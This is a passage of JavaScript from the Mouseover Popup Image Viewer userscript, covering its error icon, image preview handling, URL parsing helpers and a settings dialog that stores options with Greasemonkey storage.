			error:'data:image/gif;base64,R0lGODlhHgAeAOZ1AMwzM6IOEf9mZqkVGu9VWsZJTexSWNlARq4lKawYG//MzKIUGN1ESenJya8bHrMeI+RKULYhJt6vsOBHTOpQVbolKOdNU58PE6MWGf///6srLepRV7A5O82BgqERFbAcH64ZHrolKrIeIZkAAOfDw6wXHOCxsrciJ86EhbMeIffr67M/Qfju7rRCRKIOE9hARZ8OEdpCR6MQE7UgI9+vsM+GiM6DhqURFMZKTqQZHKAMEelPVKsaHt9GS+eanOJITrs5PagVGKIRFuSZnNtKT6YSF/+ZmeW9vqURFtlBRqYgJJ4NEa0jJ7UvM7YxNezMzOlYXaMTF64aHenHyKsXGqkVGKQVGe5vdK4gJMRHS68lKcxmZsFCRuNJT/h9gbkkJ+dWWt9KT7MsMKgcIORLUOS6u7smKeZMUdxDSLIdIuVLUaARFLgjJuVPVOZMUqkWGcpPU6cTFqQQFaIXG+jFxv///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAHUALAAAAAAeAB4AAAf/gHWCGTUtMCOIiYqLIzAtNRmCkiQaUThbW3A4BZydngVcTUuIGiSSJiNORl4Cra6vsK1tAIkmdSwYQEatGwAbsbG9vwAiIxgsHVa7BDEXNnMABNLT1AALNhcxBEmIHRwAVwYvFxIZdNAG6erp1nQZEhcvBrQca1lQO+QZ++cAFP8A2+17J2QHmhE5RgCwAGFOg4HmoFmYaEHgQAVE1HRJJAYCBAAOIfbzaHGfAgFnPCbSMqElyIcD+5XMcNJNywmJEDDYyeClyDkL3F0UQIYng5wHkib1OXAKTJMCfihNmhOA1atMIULtgdVq1a5WQ2o92RPsV7AAlGjNgPbqWawh4oKuPRcC7VurJ+SujXjCLCIEXWfoNfnk54yub1PMEWoSzOKfKbDmrED5w+OhxC7zm/OBcoVETCJEAKGZpgAAokkzjghCdKIxD9KUPgngge0HJUrTwWJb0QcHHspBBeCguPEqmhWEcSAFUUIeCYIENw0ggfXr1uM8PmkmwRtjHEbIGDCgiIchp8mrXz8AyRwfAkKQlzGCQwdEN+LoZ1NCv////31BhX43dKMCBiPo4IIcDDbo4IMPuqCDMSrUQcMiAWSo4YYcBrAIDZIcoQEjJJY4ggZlSDIICiuYaOIKKEQiSCAAOw=='
		};
		s.style.backgroundImage = 'url(' + srcs[status] + ')';
		s.setAttribute('status', status);
		s.style.display = '';
	} else {
		s.parentNode.removeChild(s);
	}
}

function getPreview() {
	return $('mpiv-preview');
}

function setPreview(src) {
	var s = getPreview();
	if(!s && !src) return;
	if(!s) {
		s = d.createElement('img');
		s.id = 'mpiv-preview';
		s.style.cssText = 'display:none;border:1px solid gray;background-color:white;position:fixed;z-index:300000;margin:0;cursor:default;' + cfg.css;
		on(s, 'error', showError);
		d.body.appendChild(s);
	}
	if(src) {
		s.src = src;
		s.style.display = 'none';
	} else {
		cur.zoom = false;
		off(s, 'error', showError);
		s.parentNode.removeChild(s);
		if(cur.node) cur.node.style.cursor = '';
	}
}

function parseUrls(url) {
	var end  = url.length - 1, urls = [];
	if(url.charAt(end) == '#') return urls;
	while(true) {
		var pos = url.lastIndexOf('http', end);
		if(pos === 0 && urls.length === 0) {
			urls.push(url);
			break;
		}
		if(pos == -1) break;
		if(/https?:\/\/[^&]+/.exec(url.substring(pos, end + 1))) {
			urls.push(RegExp.lastMatch);
		}
		if(pos === 0) break;
		end = pos - 1;
	}
	return urls;
}

function arrayMatch(a, re) {
	for(var i = a.length; i--;) {
		var m = re.exec(a[i]);
		if(m) return m;
	}
	return false;
}

function rel2abs(rel, abs) {
	if(rel.indexOf('//') === 0) rel = 'http:' + rel;
	var re = /^([a-z]+:)?\/\//;
	if(re.test(rel))  return rel;
	if(!re.exec(abs)) return false;
	if(rel[0] == '/') return abs.substr(0, abs.indexOf('/', RegExp.lastMatch.length)) + rel;
	return abs.substr(0, abs.lastIndexOf('/')) + '/' + rel;
}

function replace(s, m) {
	for(var i = m.length; i--;) {
		s = s.replace('$'+i, m[i]);
	}
	return s;
}

function styleInt(s, p) {
	var x = 0;
	for(var i = p.length; i--;) {
		x += parseInt(s.getPropertyValue(p[i], 10), 10) || 0;
	}
	return x;
}

function hasBg(node) {
	if(!node) return false;
	return window.getComputedStyle(node).getPropertyValue('background-image') != 'none';
}

function hasAcceptableSize(node, url) {
	if(!(node.tagName == 'IMG' || (node = node.querySelector('img')))) return false;
	var n = node.naturalHeight, c = node.clientHeight;
	return node.src == url && (c >= n);
}

function on(node, e, f) {
	node.addEventListener(e, f, false);
}

function off(node, e, f) {
	node.removeEventListener(e, f, false);
}

function setup() {
	if($('mpiv-setup')) return;
	GM_addStyle('\
		#mpiv-setup { position:fixed;z-index:300001;top:40px;right:40px;padding:20px 30px;background:white;width:550px;border:1px solid black; }\
		#mpiv-setup * { color:black;text-align:left;line-height:normal;font-size:12px;font-family:sans-serif; }\
		#mpiv-setup a { color:black;text-decoration:underline; }\
		#mpiv-setup div { text-align:center;font-weight:bold;font-size:14px; }\
		#mpiv-setup ul { margin:15px 0 15px 0;padding:0;list-style:none;background:white;border:0; }\
		#mpiv-setup input { border:1px solid gray;padding:1px;background:none;position:relative;bottom:-2px; }\
		#mpiv-setup-context:not(:checked) + p { display:none; }\
		#mpiv-setup input[type=text] { width:50px; }\
		#mpiv-setup li { margin:0;padding:6px 0;vertical-align:middle;background:white;border:0 }\
		#mpiv-setup p { background:white;color:gray;padding:2px 0; margin:0; }\
		#mpiv-setup textarea { height:100px;width:100%;font-size:11px;font-family:monospace;background:none;border:1px solid gray;padding:1px; }\
		#mpiv-setup #mpiv-setup-css { height:30px; }\
		#mpiv-setup button { width:150px;margin:0 10px;text-align:center; }\
	');
	var div = d.createElement('div');
	div.id = 'mpiv-setup';
	d.body.appendChild(div);
	div.innerHTML = '<div>Mouseover Popup Image Viewer</div><ul><li>Popup delay: <input id="mpiv-setup-delay" type="text"/> ms</li><li><input type="checkbox" id="mpiv-setup-thumbsonly"> Allow popup over text-only links (e.g. headlines)</li><li><input type="checkbox" id="mpiv-setup-img"> Allow popup over images that have been scaled down in HTML</li><li><input type="checkbox" id="mpiv-setup-context"> Use right mouse button to activate zoom (in addition to shift)<p>To open context menu: Right-click before popup is shown or hold down shift while right-clicking.</p></li><li>Custom CSS for preview image (units in px):<textarea id="mpiv-setup-css" spellcheck="false"></textarea></li><li>Custom host rules (one per line):<p>Format: {"r":"urlpattern", "s":"urlsubstitution", "q":"selector", "xhr":true, "html":true}&nbsp;&nbsp;<a href="http://w9p.co/userscripts/mpiv/host_rules.html" target="_blank">more info...</a></p><textarea id="mpiv-setup-hosts" spellcheck="false"></textarea></li></ul><div><button id="mpiv-setup-ok">OK</button><button id="mpiv-setup-cancel">Cancel</button></div>';
	div = null;
	var close = function() { var div = $('mpiv-setup'); div.parentNode.removeChild(div); };
	on($('mpiv-setup-ok'), 'click', function() {
		var delay = parseInt($('mpiv-setup-delay').value, 10);
		if(!isNaN(delay) && delay >= 0) GM_setValue('delay', cfg.delay = delay);
		GM_setValue('thumbsonly', cfg.thumbsonly = !$('mpiv-setup-thumbsonly').checked);
		GM_setValue('img', cfg.img = !!$('mpiv-setup-img').checked);
		GM_setValue('context', cfg.context = !!$('mpiv-setup-context').checked);
		GM_setValue('css', cfg.css = $('mpiv-setup-css').value.trim());
		GM_setValue('hosts', cfg.hosts = $('mpiv-setup-hosts').value.trim());
		loadHosts();
		close();
	});
	on($('mpiv-setup-cancel'), 'click', close);
	$('mpiv-setup-delay').value = cfg.delay;
	$('mpiv-setup-thumbsonly').checked = !cfg.thumbsonly;
	$('mpiv-setup-img').checked = cfg.img;
	$('mpiv-setup-context').checked = cfg.context;
	$('mpiv-setup-css').value = cfg.css;
	$('mpiv-setup-hosts').value = cfg.hosts;
}

on(d.body, 'mouseover', onMouseOver);
GM_registerMenuCommand('Set up Mouseover Popup Image Viewer', setup);